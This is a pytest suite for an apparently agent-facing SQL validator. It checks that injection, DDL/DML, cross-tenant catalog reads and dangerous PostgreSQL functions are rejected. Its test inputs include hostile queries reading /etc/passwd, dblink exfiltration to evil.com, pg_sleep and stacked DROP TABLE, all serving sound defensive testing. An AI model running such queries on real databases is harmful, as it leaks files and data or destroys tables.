"""
Comprehensive tests for SQL validation.

Tests cover security-critical functionality:
- SQL injection attempts
- Blocked statements (INSERT, UPDATE, DELETE, etc.)
- Schema enforcement
- Multi-statement rejection
- Dangerous functions
- LIMIT injection and capping
- Table filtering
"""

import pytest
import sqlglot
from sqlglot import exp

from apps.agents.prompts.base_system import BASE_SYSTEM_PROMPT
from mcp_server.services.sql_validator import (
    ALLOWED_ANALYTICS_FUNCTIONS,
    SQLValidationError,
    SQLValidator,
)


class TestSQLInjectionPrevention:
    """Test prevention of SQL injection attempts."""

    def test_reject_comment_injection(self):
        """Test rejection of SQL injection via comments."""
        validator = SQLValidator(schema="public")

        # Various comment injection attempts
        with pytest.raises(SQLValidationError, match="(?i)multiple.*statements"):
            validator.validate("SELECT * FROM users; -- DROP TABLE users")

        with pytest.raises(SQLValidationError, match="(?i)multiple.*statements"):
            validator.validate("SELECT * FROM users; /* malicious */ DROP TABLE users;")

    def test_reject_union_injection(self):
        """Test handling of UNION-based injection attempts."""
        validator = SQLValidator(schema="public")

        # UNION SELECT is valid SQL and should work for legitimate queries
        # This test ensures we're validating structure, not just blocking keywords
        sql = "SELECT id FROM users UNION SELECT id FROM orders"
        # The validator returns a sqlglot statement if valid
        result = validator.validate(sql)
        # If we get here without exception, the query is valid
        assert result is not None

        # Verify the validated query only contains SELECT statements
        # by checking it's not a data manipulation statement
        result_sql = result.sql(dialect="postgres").upper()
        assert "INSERT" not in result_sql
        assert "UPDATE" not in result_sql
        assert "DELETE" not in result_sql
        assert "DROP" not in result_sql
        # Verify UNION is preserved (legitimate use case)
        assert "UNION" in result_sql

    def test_reject_stacked_queries(self):
        """Test rejection of stacked queries (multiple statements)."""
        validator = SQLValidator(schema="public")

        with pytest.raises(SQLValidationError, match="(?i)multiple.*statements"):
            validator.validate("SELECT * FROM users; SELECT * FROM orders;")

        with pytest.raises(SQLValidationError, match="(?i)multiple.*statements"):
            validator.validate("SELECT id FROM users; DROP TABLE sessions;")

    def test_reject_string_escape_injection(self):
        """Test rejection of injection via string escape."""
        validator = SQLValidator(schema="public")

        # These should parse correctly and we validate they're SELECT only
        sql = "SELECT * FROM users WHERE name = 'O''Reilly'"
        result = validator.validate(sql)
        # If we get here without exception, the query is valid
        assert result is not None

    def test_reject_function_injection(self):
        """Test rejection of dangerous functions in various positions."""
        validator = SQLValidator(schema="public")

        dangerous_sqls = [
            "SELECT pg_read_file('/etc/passwd')",
            "SELECT dblink('host=evil.com', 'SELECT credit_cards FROM users')",
            "SELECT lo_import('/etc/passwd')",
        ]

        for sql in dangerous_sqls:
            with pytest.raises(SQLValidationError, match="(?i)not allowed"):
                validator.validate(sql)


class TestBlockedStatements:
    """Test rejection of non-SELECT statements."""

    def test_reject_insert(self):
        """Test rejection of INSERT statements."""
        validator = SQLValidator(schema="public")

        with pytest.raises(SQLValidationError, match="(?i)only SELECT"):
            validator.validate("INSERT INTO users (name) VALUES ('test')")

    def test_reject_update(self):
        """Test rejection of UPDATE statements."""
        validator = SQLValidator(schema="public")

        with pytest.raises(SQLValidationError, match="(?i)only SELECT"):
            validator.validate("UPDATE users SET name = 'test' WHERE id = 1")

    def test_reject_delete(self):
        """Test rejection of DELETE statements."""
        validator = SQLValidator(schema="public")

        with pytest.raises(SQLValidationError, match="(?i)only SELECT"):
            validator.validate("DELETE FROM users WHERE id = 1")

    def test_reject_drop(self):
        """Test rejection of DROP statements."""
        validator = SQLValidator(schema="public")

        with pytest.raises(SQLValidationError, match="(?i)only SELECT"):
            validator.validate("DROP TABLE users")

        with pytest.raises(SQLValidationError, match="(?i)only SELECT"):
            validator.validate("DROP DATABASE mydb")

    def test_reject_alter(self):
        """Test rejection of ALTER statements."""
        validator = SQLValidator(schema="public")

        with pytest.raises(SQLValidationError, match="(?i)only SELECT"):
            validator.validate("ALTER TABLE users ADD COLUMN email TEXT")

    def test_reject_truncate(self):
        """Test rejection of TRUNCATE statements."""
        validator = SQLValidator(schema="public")

        with pytest.raises(SQLValidationError, match="(?i)only SELECT"):
            validator.validate("TRUNCATE TABLE users")

    def test_reject_create(self):
        """Test rejection of CREATE statements."""
        validator = SQLValidator(schema="public")

        with pytest.raises(SQLValidationError, match="(?i)only SELECT"):
            validator.validate("CREATE TABLE test (id INT)")

        with pytest.raises(SQLValidationError, match="(?i)only SELECT"):
            validator.validate("CREATE INDEX idx_name ON users(name)")

    def test_allow_select(self):
        """Test that SELECT statements are allowed."""
        validator = SQLValidator(schema="public")

        statement = validator.validate("SELECT * FROM users")
        assert statement is not None
        tables = validator.get_tables_accessed(statement)
        assert "users" in tables

    def test_allow_select_with_subquery(self):
        """Test that SELECT with subqueries is allowed."""
        validator = SQLValidator(schema="public")

        sql = "SELECT * FROM users WHERE id IN (SELECT user_id FROM orders)"
        statement = validator.validate(sql)
        assert statement is not None


class TestSchemaEnforcement:
    """Test schema validation and enforcement."""

    def test_reject_wrong_schema(self):
        """Test rejection of queries accessing wrong schema."""
        validator = SQLValidator(schema="analytics")

        # Query without schema qualification defaults to search_path
        # We need to test explicit schema qualification
        with pytest.raises(SQLValidationError, match="(?i)schema"):
            validator.validate("SELECT * FROM other_schema.users")

        # Note: public schema is always allowed alongside the specified schema
        # So this is a valid query even when schema="analytics"
        statement = validator.validate("SELECT * FROM public.sensitive_data")
        assert statement is not None

    def test_allow_correct_schema(self):
        """Test that queries in correct schema are allowed."""
        validator = SQLValidator(schema="analytics")

        # Explicit schema qualification
        statement = validator.validate("SELECT * FROM analytics.users")
        assert statement is not None

        # Implicit schema (no qualification)
        statement = validator.validate("SELECT * FROM users")
        assert statement is not None

    def test_reject_cross_schema_join(self):
        """Test rejection of joins across unauthorized schemas."""
        validator = SQLValidator(schema="analytics")

        # Joining analytics and public is allowed (public is always accessible)
        sql_allowed = "SELECT * FROM analytics.users u JOIN public.orders o ON u.id = o.user_id"
        statement = validator.validate(sql_allowed)
        assert statement is not None

        # But joining analytics with some other schema should be rejected
        sql_rejected = (
            "SELECT * FROM analytics.users u JOIN other_schema.orders o ON u.id = o.user_id"
        )
        with pytest.raises(SQLValidationError, match="(?i)schema"):
            validator.validate(sql_rejected)

    def test_allow_public_schema_when_specified(self):
        """Test that public schema queries work when schema is 'public'."""
        validator = SQLValidator(schema="public")

        statement = validator.validate("SELECT * FROM users")
        assert statement is not None

        statement = validator.validate("SELECT * FROM public.users")
        assert statement is not None


class TestMultiStatementRejection:
    """Test rejection of multiple SQL statements."""

    def test_reject_semicolon_separated(self):
        """Test rejection of semicolon-separated statements."""
        validator = SQLValidator(schema="public")

        with pytest.raises(SQLValidationError, match="(?i)multiple.*statements"):
            validator.validate("SELECT * FROM users; SELECT * FROM orders;")

    def test_reject_with_trailing_semicolon(self):
        """Test handling of trailing semicolons (should be OK)."""
        validator = SQLValidator(schema="public")

        # Single statement with trailing semicolon should be allowed
        statement = validator.validate("SELECT * FROM users;")
        assert statement is not None

    def test_reject_with_cte_and_multiple_statements(self):
        """Test rejection when CTE is followed by another statement."""
        validator = SQLValidator(schema="public")

        sql = """
        WITH user_stats AS (
            SELECT user_id, COUNT(*) as cnt FROM orders GROUP BY user_id
        )
        SELECT * FROM user_stats;
        DROP TABLE users;
        """

        with pytest.raises(SQLValidationError, match="(?i)multiple.*statements"):
            validator.validate(sql)

    def test_allow_single_cte(self):
        """Test that CTEs (WITH clauses) are allowed."""
        validator = SQLValidator(schema="public")

        sql = """
        WITH user_stats AS (
            SELECT user_id, COUNT(*) as cnt FROM orders GROUP BY user_id
        )
        SELECT * FROM user_stats
        """

        statement = validator.validate(sql)
        assert statement is not None


class TestDangerousFunctions:
    """Test rejection of dangerous PostgreSQL functions."""

    @pytest.mark.parametrize(
        "function_name",
        ["query_to_xmlschema", "pg_catalog.query_to_xmlschema", '"query_to_xmlschema"'],
    )
    def test_reject_query_schema_conversion(self, function_name):
        """SQL-bearing XML conversion must be rejected before database execution."""
        validator = SQLValidator(schema="public")

        with pytest.raises(SQLValidationError) as exc_info:
            validator.validate(f"SELECT {function_name}('SELECT 1', false, false, '')")

        assert exc_info.value.error_type == "dangerous_function"

    def test_reject_pg_read_file(self):
        """Test rejection of pg_read_file function."""
        validator = SQLValidator(schema="public")

        with pytest.raises(SQLValidationError, match="(?i)not allowed.*security"):
            validator.validate("SELECT pg_read_file('/etc/passwd')")

    def test_reject_pg_read_binary_file(self):
        """Test rejection of pg_read_binary_file function."""
        validator = SQLValidator(schema="public")

        with pytest.raises(SQLValidationError, match="(?i)not allowed.*security"):
            validator.validate("SELECT pg_read_binary_file('/etc/passwd')")

    def test_reject_pg_ls_dir(self):
        """Test rejection of pg_ls_dir function."""
        validator = SQLValidator(schema="public")

        with pytest.raises(SQLValidationError, match="(?i)not allowed.*security"):
            validator.validate("SELECT pg_ls_dir('/etc')")

    def test_reject_dblink(self):
        """Test rejection of dblink function."""
        validator = SQLValidator(schema="public")

        with pytest.raises(SQLValidationError, match="(?i)not allowed.*security"):
            validator.validate("SELECT * FROM dblink('host=evil.com', 'SELECT * FROM users')")

    def test_reject_lo_import(self):
        """Test rejection of lo_import function."""
        validator = SQLValidator(schema="public")

        with pytest.raises(SQLValidationError, match="(?i)not allowed.*security"):
            validator.validate("SELECT lo_import('/etc/passwd')")

    def test_reject_lo_export(self):
        """Test rejection of lo_export function."""
        validator = SQLValidator(schema="public")

        with pytest.raises(SQLValidationError, match="(?i)not allowed.*security"):
            validator.validate("SELECT lo_export(12345, '/tmp/export.dat')")

    def test_reject_copy_from(self):
        """Test rejection of COPY FROM (if parsed as SELECT)."""
        validator = SQLValidator(schema="public")

        # COPY is a different statement type, should be rejected
        with pytest.raises(SQLValidationError):
            validator.validate("COPY users FROM '/tmp/data.csv'")

    @pytest.mark.parametrize(
        "sql",
        [
            "SELECT custom_report(1)",
            "SELECT * FROM custom_rows(1)",
            "SELECT public.round(1.2)",
            "SELECT other_schema.count(1)",
            "SELECT COALESCE(custom_report(1), 0)",
            "SELECT pg_catalog.timestamp_trunc(1)",
        ],
    )
    def test_reject_functions_outside_analytics_allowlist(self, sql):
        with pytest.raises(SQLValidationError) as exc_info:
            SQLValidator().validate(sql)

        assert exc_info.value.error_type == "function_not_allowed"

    @pytest.mark.parametrize(
        "sql",
        [
            "SELECT AVG(amount), SUM(amount), COUNT(DISTINCT id) FROM orders",
            "SELECT CASE WHEN amount > 0 THEN COALESCE(amount, 0) ELSE NULL END FROM orders",
            "SELECT ROUND(AVG(amount)::numeric, 2), MIN(amount), MAX(amount) FROM orders",
            "SELECT ROW_NUMBER() OVER (ORDER BY amount), LAG(amount) OVER () FROM orders",
            "SELECT DENSE_RANK() OVER (), FIRST_VALUE(amount) OVER () FROM orders",
            "SELECT PERCENTILE_CONT(0.5) WITHIN GROUP (ORDER BY amount) FROM orders",
            "SELECT DATE_TRUNC('month', created_at), EXTRACT(year FROM created_at) FROM orders",
            "SELECT NOW(), CURRENT_DATE, AGE(created_at), TO_CHAR(created_at, 'YYYY') FROM orders",
            "SELECT LOWER(name), LENGTH(name), SPLIT_PART(name, ' ', 1), TRIM(name) FROM users",
            "SELECT REGEXP_REPLACE(name, 'a', 'b', 'g'), REPLACE(name, 'a', 'b') FROM users",
            "SELECT STRING_AGG(name, ','), ARRAY_AGG(name) FROM users",
            "SELECT JSONB_AGG(data), JSONB_BUILD_OBJECT('count', COUNT(*)) FROM events",
            "SELECT JSONB_ARRAY_ELEMENTS(data), JSONB_EXTRACT_PATH_TEXT(data, 'name') FROM events",
            "SELECT data->>'name', data->'details' FROM events",
            "SELECT UNNEST(ARRAY[1, 2]), GENERATE_SERIES(1, 3)",
            "SELECT pg_catalog.round(1.2), ABS(-1), GREATEST(1, 2), LEAST(1, 2)",
            "SELECT EXISTS(SELECT 1 FROM orders WHERE amount > 0)",
            "SELECT TO_DATE('2026-01-01', 'YYYY-MM-DD'), TO_TIMESTAMP('2026', 'YYYY')",
            "SELECT ARRAY_LENGTH(ARRAY[1, 2], 1), CHAR_LENGTH('abc')",
        ],
    )
    def test_allow_core_analytics(self, sql):
        assert SQLValidator().validate(sql) is not None

    def test_builtin_calls_are_bound_to_pg_catalog(self):
        statement = SQLValidator().validate(
            "SELECT ROUND(AVG(amount), 2), pg_catalog.abs(-1) FROM orders"
        )
        rendered = statement.sql(dialect="postgres")
        assert "pg_catalog.ROUND(" in rendered
        assert "pg_catalog.AVG(amount)" in rendered
        assert "pg_catalog.abs(-1)" in rendered

    def test_quoted_function_names_are_bound_to_pg_catalog(self):
        statement = SQLValidator().validate('SELECT "jsonb_build_array"(1)')
        assert 'pg_catalog."jsonb_build_array"' in statement.sql(dialect="postgres")

    def test_allow_safe_functions(self):
        """Test that safe functions are allowed."""
        validator = SQLValidator(schema="public")

        safe_sqls = [
            "SELECT COUNT(*) FROM users",
            "SELECT SUM(amount) FROM orders",
            "SELECT NOW()",
            "SELECT UPPER(name) FROM users",
            "SELECT CONCAT(first_name, ' ', last_name) FROM users",
            "SELECT DATE_TRUNC('day', created_at) FROM orders",
        ]

        for sql in safe_sqls:
            statement = validator.validate(sql)
            assert statement is not None


class TestLimitInjection:
    """Test automatic LIMIT injection and capping."""

    def test_inject_limit_when_missing(self):
        """Test that LIMIT is added when missing."""
        validator = SQLValidator(schema="public", max_limit=100)

        sql = "SELECT * FROM users"
        statement = validator.validate(sql)
        modified = validator.inject_limit(statement)
        result = modified.sql(dialect="postgres")

        assert "LIMIT" in result.upper()
        assert "100" in result

    def test_cap_excessive_limit(self):
        """Test that excessive LIMIT is capped to max_rows."""
        validator = SQLValidator(schema="public", max_limit=100)

        sql = "SELECT * FROM users LIMIT 10000"
        statement = validator.validate(sql)
        modified = validator.inject_limit(statement)
        result = modified.sql(dialect="postgres")

        assert "LIMIT" in result.upper()
        # Should be capped to 100
        assert "10000" not in result
        assert "100" in result

    def test_preserve_reasonable_limit(self):
        """Test that reasonable LIMIT is preserved."""
        validator = SQLValidator(schema="public", max_limit=100)

        sql = "SELECT * FROM users LIMIT 50"
        statement = validator.validate(sql)
        modified = validator.inject_limit(statement)
        result = modified.sql(dialect="postgres")

        assert "LIMIT" in result.upper()
        assert "50" in result

    def test_handle_limit_with_offset(self):
        """Test LIMIT with OFFSET is handled correctly."""
        validator = SQLValidator(schema="public", max_limit=100)

        sql = "SELECT * FROM users LIMIT 50 OFFSET 10"
        statement = validator.validate(sql)
        modified = validator.inject_limit(statement)
        result = modified.sql(dialect="postgres")

        assert "LIMIT" in result.upper()
        assert "OFFSET" in result.upper()

    def test_inject_limit_with_order_by(self):
        """Test LIMIT injection with ORDER BY clause."""
        validator = SQLValidator(schema="public", max_limit=100)

        sql = "SELECT * FROM users ORDER BY created_at DESC"
        statement = validator.validate(sql)
        modified = validator.inject_limit(statement)
        result = modified.sql(dialect="postgres")

        assert "ORDER BY" in result.upper()
        assert "LIMIT" in result.upper()
        # LIMIT should come after ORDER BY
        assert result.upper().index("ORDER BY") < result.upper().index("LIMIT")

    def test_inject_limit_with_subquery(self):
        """Test LIMIT injection with subqueries."""
        validator = SQLValidator(schema="public", max_limit=100)

        sql = "SELECT * FROM (SELECT * FROM users) AS subq"
        statement = validator.validate(sql)
        modified = validator.inject_limit(statement)
        result = modified.sql(dialect="postgres")

        # LIMIT should be on outer query
        assert "LIMIT" in result.upper()


class TestEdgeCases:
    """Test edge cases and special scenarios."""

    def test_empty_query(self):
        """Test handling of empty query."""
        validator = SQLValidator(schema="public")

        with pytest.raises(SQLValidationError, match="(?i)empty|invalid"):
            validator.validate("")

        with pytest.raises(SQLValidationError, match="(?i)empty|invalid"):
            validator.validate("   ")

    def test_whitespace_and_formatting(self):
        """Test that various whitespace and formatting styles work."""
        validator = SQLValidator(schema="public")

        queries = [
            "SELECT * FROM users",
            "SELECT\n*\nFROM\nusers",
            "  SELECT  *  FROM  users  ",
            "\tSELECT\t*\tFROM\tusers",
        ]

        for sql in queries:
            statement = validator.validate(sql)
            assert statement is not None

    def test_case_insensitivity(self):
        """Test that SQL keywords are case-insensitive."""
        validator = SQLValidator(schema="public")

        queries = [
            "select * from users",
            "SELECT * FROM users",
            "Select * From Users",
            "SeLeCt * FrOm UsErS",
        ]

        for sql in queries:
            statement = validator.validate(sql)
            assert statement is not None

    def test_complex_select(self):
        """Test validation of complex SELECT queries."""
        validator = SQLValidator(schema="public")

        sql = """
        SELECT
            u.id,
            u.name,
            COUNT(o.id) as order_count,
            SUM(o.amount) as total_amount,
            AVG(o.amount) as avg_amount
        FROM users u
        LEFT JOIN orders o ON u.id = o.user_id
        WHERE u.created_at >= '2024-01-01'
            AND u.status = 'active'
        GROUP BY u.id, u.name
        HAVING COUNT(o.id) > 5
        ORDER BY total_amount DESC
        """

        statement = validator.validate(sql)
        assert statement is not None
        tables = validator.get_tables_accessed(statement)
        assert "users" in tables
        assert "orders" in tables

    def test_validation_result_structure(self):
        """Test that validation result has expected structure."""
        validator = SQLValidator(schema="public")

        sql = "SELECT id, name FROM users WHERE status = 'active'"
        statement = validator.validate(sql)

        # The validator returns an Expression (AST), not a result object
        assert statement is not None
        # Can extract tables from the statement
        tables = validator.get_tables_accessed(statement)
        assert isinstance(tables, list)
        assert "users" in tables


class TestSystemCatalogDisclosure:
    """Issue #244: block cross-tenant metadata disclosure via system catalogs."""

    def test_reject_unqualified_pg_namespace(self):
        validator = SQLValidator(schema="ws_demo")
        with pytest.raises(SQLValidationError, match="(?i)system catalog|pg_catalog"):
            validator.validate("SELECT nspname FROM pg_namespace")

    def test_reject_unqualified_pg_class(self):
        validator = SQLValidator(schema="ws_demo")
        with pytest.raises(SQLValidationError, match="(?i)system catalog|pg_catalog"):
            validator.validate("SELECT relname, reltuples FROM pg_class")

    def test_reject_unqualified_pg_tables(self):
        validator = SQLValidator(schema="ws_demo")
        with pytest.raises(SQLValidationError, match="(?i)system catalog|pg_catalog"):
            validator.validate("SELECT schemaname FROM pg_tables")

    def test_reject_unqualified_pg_views(self):
        validator = SQLValidator(schema="ws_demo")
        with pytest.raises(SQLValidationError, match="(?i)system catalog|pg_catalog"):
            validator.validate("SELECT viewname FROM pg_views")

    def test_reject_unqualified_pg_catalog_in_join(self):
        """A system catalog hidden inside a JOIN must still be caught."""
        validator = SQLValidator(schema="ws_demo")
        with pytest.raises(SQLValidationError, match="(?i)system catalog|pg_catalog"):
            validator.validate("SELECT n.nspname FROM users u JOIN pg_namespace n ON true")

    def test_reject_schema_qualified_pg_catalog(self):
        """Explicit pg_catalog.* is rejected by schema enforcement too."""
        validator = SQLValidator(schema="ws_demo")
        with pytest.raises(SQLValidationError, match="(?i)pg_catalog|schema|system catalog"):
            validator.validate("SELECT * FROM pg_catalog.pg_class")

    def test_allow_legitimate_unqualified_table(self):
        """A normal user table that is not a system catalog must still pass."""
        validator = SQLValidator(schema="ws_demo")
        statement = validator.validate("SELECT id FROM users")
        assert statement is not None


class TestDataModifyingStatements:
    """Issue #244: harden statement-type checks against hidden DML."""

    def test_reject_select_into(self):
        """SELECT ... INTO creates a table — must be rejected."""
        validator = SQLValidator(schema="public")
        with pytest.raises(SQLValidationError, match="(?i)only SELECT|INTO"):
            validator.validate("SELECT * INTO new_table FROM users")

    def test_reject_cte_insert(self):
        """A data-modifying CTE (WITH x AS (INSERT ...)) must be rejected."""
        validator = SQLValidator(schema="public")
        with pytest.raises(SQLValidationError, match="(?i)only SELECT|INSERT|modif"):
            validator.validate(
                "WITH x AS (INSERT INTO users VALUES (1) RETURNING id) SELECT * FROM x"
            )

    def test_reject_cte_update(self):
        validator = SQLValidator(schema="public")
        with pytest.raises(SQLValidationError, match="(?i)only SELECT|UPDATE|modif"):
            validator.validate("WITH x AS (UPDATE users SET a = 1 RETURNING id) SELECT * FROM x")

    def test_reject_cte_delete(self):
        validator = SQLValidator(schema="public")
        with pytest.raises(SQLValidationError, match="(?i)only SELECT|DELETE|modif"):
            validator.validate("WITH x AS (DELETE FROM users RETURNING id) SELECT * FROM x")

    def test_allow_read_only_cte(self):
        """A read-only CTE must still pass."""
        validator = SQLValidator(schema="public")
        statement = validator.validate("WITH x AS (SELECT id FROM users) SELECT * FROM x")
        assert statement is not None


class TestCteAliasCannotShadowQualifiedTable:
    """A CTE whose name matches a schema-qualified table must not hide that table
    from the schema allowlist (or from the audit trail)."""

    def test_cte_named_after_information_schema_relation(self):
        validator = SQLValidator(schema="ws_demo")
        with pytest.raises(SQLValidationError, match="information_schema"):
            validator.validate(
                "WITH schemata AS (SELECT 1) SELECT * FROM information_schema.schemata"
            )

    def test_cte_named_after_another_tenants_table(self):
        validator = SQLValidator(schema="ws_demo")
        with pytest.raises(SQLValidationError, match="t_othertenant"):
            validator.validate("WITH users AS (SELECT 1) SELECT * FROM t_othertenant.users")

    def test_qualified_table_shadowed_by_cte_still_reported(self):
        validator = SQLValidator(schema="ws_demo")
        statement = validator.validate("WITH visits AS (SELECT 1) SELECT * FROM ws_demo.visits")
        assert validator.get_tables_accessed(statement) == ["ws_demo.visits"]

    def test_bare_cte_reference_is_still_not_a_table(self):
        validator = SQLValidator(schema="ws_demo")
        statement = validator.validate("WITH visits AS (SELECT 1 AS n) SELECT * FROM visits")
        assert validator.get_tables_accessed(statement) == []


class TestWholePgNamespaceIsRejected:
    """An enumerated denylist missed catalog views from the same family it listed
    (it had pg_stat_all_tables but not pg_statio_all_tables). These views keep the
    default PUBLIC SELECT grant, so they list every tenant's schema and table
    names regardless of SET ROLE. The rule is the `pg_` prefix, applied to the
    unqualified references the schema allowlist cannot see."""

    @pytest.mark.parametrize(
        "relation",
        [
            "pg_statio_all_tables",
            "pg_stat_user_indexes",
            "pg_stat_all_indexes",
            "pg_rewrite",
            "pg_available_extensions",
            "pg_locks",
            "pg_prepared_statements",
        ],
    )
    def test_unqualified_pg_relation_is_rejected(self, relation):
        validator = SQLValidator(schema="ws_demo")
        with pytest.raises(SQLValidationError, match="(?i)system catalog"):
            validator.validate(f"SELECT * FROM {relation}")

    def test_qualified_pg_relation_is_rejected(self):
        validator = SQLValidator(schema="ws_demo")
        with pytest.raises(SQLValidationError, match="(?i)system catalog|pg_catalog"):
            validator.validate("SELECT * FROM pg_catalog.pg_statio_all_tables")

    def test_tenant_tables_are_unaffected(self):
        validator = SQLValidator(schema="ws_demo")
        statement = validator.validate("SELECT * FROM page_views JOIN programs USING (id)")
        assert sorted(validator.get_tables_accessed(statement)) == ["page_views", "programs"]

    def test_tenant_table_named_pg_something_stays_reachable_when_qualified(self):
        """Postgres reserves `pg_` for schema names, not table names, so a tenant
        table really can be called `pg_notes`. Qualifying it is how you reach it;
        the allowlist, not the prefix rule, decides."""
        validator = SQLValidator(schema="ws_demo")
        statement = validator.validate("SELECT * FROM ws_demo.pg_notes")
        assert validator.get_tables_accessed(statement) == ["ws_demo.pg_notes"]

    def test_unqualified_pg_name_is_still_rejected_even_if_a_tenant_owns_one(self):
        """Unqualified, `pg_notes` resolves through the implicit pg_catalog first,
        so refusing it is the safe reading — and the qualified form above is the
        way through."""
        validator = SQLValidator(schema="ws_demo")
        with pytest.raises(SQLValidationError, match="(?i)system catalog"):
            validator.validate("SELECT * FROM pg_notes")


class TestTokenizerErrors:
    """An unterminated quote raises sqlglot's TokenError, a sibling of ParseError
    rather than a subclass — it must still come back as a validation error, not
    escape as an unhandled exception."""

    @pytest.mark.parametrize(
        "sql",
        [
            "SELECT * FROM notes WHERE author = 'O'Brien'",
            'SELECT * FROM "unterminated',
            "SELECT * FROM notes WHERE body = 'no closing quote",
        ],
    )
    def test_unterminated_literal_is_a_validation_error(self, sql):
        validator = SQLValidator(schema="ws_demo")
        with pytest.raises(SQLValidationError) as exc_info:
            validator.validate(sql)
        assert exc_info.value.error_type == "parse_error"


class TestDangerousTimingFunctions:
    """Issue #244: pg_sleep (DoS) and set_config (session tampering)."""

    def test_reject_pg_sleep(self):
        validator = SQLValidator(schema="public")
        with pytest.raises(SQLValidationError, match="(?i)not allowed"):
            validator.validate("SELECT pg_sleep(10)")

    def test_reject_set_config(self):
        validator = SQLValidator(schema="public")
        with pytest.raises(SQLValidationError, match="(?i)not allowed"):
            validator.validate("SELECT set_config('search_path', 'pg_catalog', false)")


class TestPromptValidatorAlignment:
    """Meta-tests ensuring the system prompt matches the validator's real behavior."""

    def test_information_schema_qualified_is_rejected(self):
        validator = SQLValidator(schema="ws_demo")
        with pytest.raises(SQLValidationError, match="information_schema"):
            validator.validate("SELECT * FROM information_schema.columns")

    def test_unqualified_pg_catalog_views_are_rejected(self):
        """Unqualified system-catalog reads resolve via implicit pg_catalog and
        leak cross-tenant metadata (schema names from external_id, row counts
        from pg_class.reltuples). The validator MUST reject them — secure
        contract (was previously pinned ALLOWED, see issue #244)."""
        validator = SQLValidator(schema="ws_demo")
        for sql in (
            "SELECT schemaname, tablename FROM pg_tables",
            "SELECT schemaname, viewname FROM pg_views",
            "SELECT nspname FROM pg_namespace",
            "SELECT relname, reltuples FROM pg_class",
        ):
            with pytest.raises(SQLValidationError, match="(?i)system catalog|pg_catalog"):
                validator.validate(sql)

    def test_prompt_mentions_information_schema_restriction(self):
        prompt = BASE_SYSTEM_PROMPT.lower()
        assert "information_schema" in prompt
        assert "describe_table" in prompt
        assert "list_tables" in prompt

    def test_prompt_does_not_advertise_pg_catalog_reachability(self):
        """The prompt must NOT advertise unqualified pg_catalog views as
        reachable — doing so invites chat users / prompt-injected content to
        enumerate the shared DB's customer list (issue #244)."""
        prompt = BASE_SYSTEM_PROMPT.lower()
        advertised_phrases = [
            "are reachable",
            "is reachable",
            "if you really need raw system-state introspection",
        ]
        for phrase in advertised_phrases:
            assert phrase not in prompt, (
                f"Prompt still advertises pg_catalog reachability ({phrase!r}), but the "
                "validator now rejects unqualified pg_* views (issue #244)."
            )


class TestReviewRegressions:
    @pytest.mark.parametrize("expression", ["name ~ 'abc'", "regexp_like(name, 'abc')"])
    def test_regex_preserves_column_reference(self, expression):
        sql = SQLValidator().validate(f"SELECT {expression} FROM users").sql(dialect="postgres")
        assert "pg_catalog.name" not in sql
        assert "name ~ 'abc'" in sql

    @pytest.mark.parametrize("operator", ["~", "~*", "!~", "!~*"])
    def test_regex_operators_preserve_syntax(self, operator):
        sql = (
            SQLValidator()
            .validate(f"SELECT name {operator} 'abc' FROM users")
            .sql(dialect="postgres")
        )
        assert "pg_catalog.name" not in sql
        assert "~" in sql
        assert ("~*" in sql) == ("*" in operator)
        assert ("NOT" in sql) == operator.startswith("!")

    def test_regex_function_preserves_flags(self):
        sql = (
            SQLValidator().validate("SELECT regexp_like('ABC', 'abc', 'i')").sql(dialect="postgres")
        )
        assert "pg_catalog.regexp_like('abc', 'abc', 'i')" in sql.lower()

    @pytest.mark.parametrize(
        ("expression", "normalized"),
        [
            ("bool_and(true)", "logical_and"),
            ("bool_or(false)", "logical_or"),
            ("json_agg(1)", "j_s_o_n_array_agg"),
            ("json_object_agg('key', 1)", "j_s_o_n_object_agg"),
            ("jsonb_object_agg('key', 1)", "j_s_o_n_b_object_agg"),
            ("to_timestamp(0)", "unix_to_time"),
            ("var_pop(1)", "variance_pop"),
            ("lpad('x', 3, '0')", "pad"),
            ("rpad('x', 3, '0')", "pad"),
        ],
    )
    def test_normalized_analytics_functions(self, expression, normalized):
        parsed = sqlglot.parse_one(f"SELECT {expression}", dialect="postgres")
        assert next(parsed.find_all(exp.Func)).sql_name().lower() == normalized
        rendered = SQLValidator().validate(f"SELECT {expression}").sql(dialect="postgres")
        assert "pg_catalog." in rendered

    @pytest.mark.parametrize(
        "target",
        [
            "regclass",
            "regproc",
            "regprocedure",
            "regoper",
            "regoperator",
            "regtype",
            "regrole",
            "regnamespace",
            "regcollation",
            "regconfig",
            "regdictionary",
            "custom_type[]",
            "custom_type",
            "public.custom_type",
        ],
    )
    @pytest.mark.parametrize("template", ["SELECT NULL::{target}", "SELECT CAST(NULL AS {target})"])
    def test_reject_non_core_cast_targets(self, target, template):
        with pytest.raises(SQLValidationError) as error:
            SQLValidator().validate(template.format(target=target))
        assert error.value.error_type == "cast_type_not_allowed"

    @pytest.mark.parametrize(
        "target",
        [
            "text",
            "varchar(20)",
            "numeric(12,2)",
            "integer",
            "bigint",
            "double precision",
            "boolean",
            "date",
            "timestamp",
            "timestamptz",
            "interval",
            "json",
            "jsonb",
            "uuid",
            "bytea",
            "text[]",
            "integer[][]",
        ],
    )
    def test_allow_core_cast_targets(self, target):
        assert SQLValidator().validate(f"SELECT CAST(NULL AS {target})") is not None

    @pytest.mark.parametrize(
        ("sql", "message"),
        [
            ("SELECT 1 FETCH FIRST 10 ROWS ONLY", "Use LIMIT"),
            ("SELECT * FROM users FOR UPDATE", "Row locking"),
            ("SELECT * FROM users FOR SHARE", "Row locking"),
            ("SELECT * FROM users FOR NO KEY UPDATE", "Row locking"),
            ("SELECT 1 OPERATOR(pg_catalog.+) 2", "Explicit OPERATOR"),
            ("TABLE users", "TABLE syntax"),
        ],
    )
    def test_reject_unsupported_syntax_clearly(self, sql, message):
        with pytest.raises(SQLValidationError, match=message):
            SQLValidator().validate(sql)

    @pytest.mark.parametrize("sql", ["(SELECT 1)", "((SELECT 1))", "(SELECT 1 UNION SELECT 2)"])
    def test_parenthesized_select_gets_limit(self, sql):
        validator = SQLValidator(max_limit=10)
        statement = validator.validate(sql)
        assert validator.inject_limit(statement).sql(dialect="postgres").endswith("LIMIT 10")

    def test_parenthesized_select_preserves_outer_limit(self):
        validator = SQLValidator(max_limit=10)
        statement = validator.validate("(SELECT 1) LIMIT 2")
        assert validator.limit_value(statement) == 2
        assert validator.inject_limit(statement).sql(dialect="postgres").endswith("LIMIT 2")

    def test_table_provenance_preserves_schema(self):
        validator = SQLValidator(schema="ws_test")
        statement = validator.validate("SELECT * FROM public.users JOIN ws_test.users USING (id)")
        assert validator.get_tables_accessed(statement) == ["public.users", "ws_test.users"]


